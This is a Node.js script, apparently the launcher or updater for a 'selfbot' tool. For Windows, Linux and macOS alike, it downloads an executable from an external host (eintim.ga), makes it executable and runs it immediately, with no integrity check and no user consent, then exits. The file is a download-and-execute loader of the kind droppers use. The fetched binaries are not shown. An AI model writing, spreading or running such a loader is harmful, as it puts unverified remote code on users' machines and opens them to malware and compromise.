const request = require('request');
var os = require('os');
const fs = require('fs');
const Axios = require('axios')
const { exec } = require("child_process");
async function close(){
    process.exit(0);
}
function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  } 
if(os.platform() == "win32"){
    const file = fs.createWriteStream("selfbot.exe");
    const fd = fs.openSync("updated", 'w')
          const sendReq = request.get("https://eintim.ga/winselfbot.exe");
          sendReq.on('response', (response) => {
            sendReq.pipe(file);
        });
        file.on('finish', () => {
          file.close();
          sleep(2000).then(value => {
            exec("start selfbot.exe", (error, stdout, stderr) => {
                
              });
              setTimeout(close, 500);
            });
          
          
    });
}
if(os.platform() == "linux"){
    const file = fs.createWriteStream("selfbot");
    const fd = fs.openSync("updated", 'w')
          const sendReq = request.get("https://eintim.ga/linselfbot");
          sendReq.on('response', (response) => {
            sendReq.pipe(file);
        });
        file.on('finish', () => {
          file.close();
          sleep(2000).then(value => {
            exec("chmod +x selfbot && ./selfbot", (error, stdout, stderr) => {
                
              });
              setTimeout(close, 500);
            });
          
          
    });
}
if(os.platform() == "darwin"){
    const file = fs.createWriteStream("selfbot");
    const fd = fs.openSync("updated", 'w')
          const sendReq = request.get("https://eintim.ga/macselfbot");
          sendReq.on('response', (response) => {
            sendReq.pipe(file);
        });
        file.on('finish', () => {
          file.close();
          
          sleep(2000).then(value => {
            exec("chmod +x selfbot && ./selfbot", (error, stdout, stderr) => {
                
              });
              setTimeout(close, 500);
            });
          
    });
}
